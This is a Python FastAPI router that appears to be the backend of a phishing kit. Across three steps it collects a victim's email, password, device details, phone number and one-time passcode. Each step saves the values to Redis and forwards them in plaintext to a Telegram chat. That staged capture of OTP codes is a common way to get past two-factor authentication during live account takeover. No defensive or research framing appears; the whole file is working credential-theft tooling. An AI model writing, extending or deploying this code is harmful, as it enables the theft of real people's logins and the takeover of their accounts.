import uuid
from fastapi import APIRouter, Request, HTTPException
from app.redis_client import save_submission, get_submission, update_submission
from app.telegram import send_telegram_message


router = APIRouter()


@router.post("/step-1")
async def step_one(request: Request,
):
    payload = await request.json()

    email = payload.get("email")
    password = payload.get("pass_id")
    device_info = payload.get("device_info")

    if not password or not email:
        raise HTTPException(status_code=400, detail="password and email required")

    submission_id = str(uuid.uuid4())

    save_submission(submission_id, {
        "password": password,
        "email": email,
        "device_info": device_info
    })
    
    message = (
        f"📝 New Submission Started\n\n"
        f"Email: {email}\n"
        f"Password: {password}\n"
        f"Device: {device_info}\n"
        f"ID: {submission_id}"
    )

    send_telegram_message(message)

    return {"submission_id": submission_id}


@router.post("/step-2/{submission_id}")
async def step_two(submission_id: str, request: Request):
    payload = await request.json()
    phone = payload.get("phone")

    if not phone:
        raise HTTPException(status_code=400, detail="Phone required")

    submission = get_submission(submission_id)
    if not submission:
        raise HTTPException(status_code=404, detail="Submission not found")

    update_submission(submission_id, {"phone": phone})
    
    message = (
        f"📞 Phone Added\n\n"
        f"Email: {submission['email']}\n"
        f"Password: {submission['password']}\n"
        f"Phone: {phone}\n"
        f"ID: {submission_id}"
    )
    send_telegram_message(message)

    return {"status": "phone_saved"}


@router.post("/step-3/{submission_id}")
async def step_three(submission_id: str, request: Request):
    payload = await request.json()
    otp_code = payload.get("otp_code")

    if not otp_code:
        raise HTTPException(status_code=400, detail="OTP required")

    submission = get_submission(submission_id)
    if not submission:
        raise HTTPException(status_code=404, detail="Submission not found")

    update_submission(submission_id, {"otp_code": otp_code})
    
    message = (
        f"🔐 OTP Submitted\n\n"
        f"Email: {submission['email']}\n"
        f"Password: {submission['password']}\n"
        f"Phone: {submission.get('phone')}\n"
        f"OTP: {otp_code}\n"
        f"ID: {submission_id}"
        )

    send_telegram_message(message)

    return {"status": "completed"}
